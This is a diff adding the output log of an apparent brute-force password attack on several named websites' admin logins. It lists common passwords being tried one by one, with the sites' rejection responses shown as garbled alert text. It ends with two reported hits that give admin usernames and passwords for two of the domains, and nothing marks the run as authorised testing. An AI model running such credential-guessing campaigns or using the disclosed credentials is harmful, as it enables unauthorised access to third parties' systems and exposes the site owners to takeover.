@@ -1,0 +1,24 @@
+[www.yangsha.com] starting 32 passwords
+[szsadwj.com] starting 33 passwords
+[www.yangsha.com] CHECK : <script>alert('瀵杈ラ璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK 123: <script>alert('楠璇杈ラ璇锛濡涓娓锛璇风瑰婚璇锋颁涓锛');history.back();</script
+[www.yangsha.com] CHECK 888: <script>alert('楠璇杈ラ璇锛濡涓娓锛璇风瑰婚璇锋颁涓锛');history.back();</script
+[www.yangsha.com] CHECK admin: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK 2023: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK 2024: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK admin123: <script>alert('楠璇杈ラ璇锛濡涓娓锛璇风瑰婚璇锋颁涓锛');history.back();</script
+[www.yangsha.com] CHECK 123456: <script>alert('楠璇杈ラ璇锛濡涓娓锛璇风瑰婚璇锋颁涓锛');history.back();</script
+[www.yangsha.com] CHECK admin888: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK 12345678: <script>alert('楠璇杈ラ璇锛濡涓娓锛璇风瑰婚璇锋颁涓锛');history.back();</script
+[www.yangsha.com] CHECK password: <script>alert('楠璇杈ラ璇锛濡涓娓锛璇风瑰婚璇锋颁涓锛');history.back();</script
+[www.yangsha.com] CHECK admin@123: <script>alert('瀵杈ラ璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK admin1234: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK 123456a: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[www.yangsha.com] CHECK a123456: <script>alert('ㄦ峰瀵璇锛');history.back();</script>//' SET GLOBA
+[gdcq119.com] starting 33 passwords
+RESULT: ('HIT', 'www.yangsha.com', 'admin', '666666')
+RESULT: ('HIT', 'gdcq119.com', 'admin', 'gdcq119123')
+RESULT: ('DONE', 'szsadwj.com', 'nohit')
+=== ALL DONE: 2 hits ===
+HIT: HIT	www.yangsha.com	admin	666666
+HIT: HIT	gdcq119.com	admin	gdcq119123
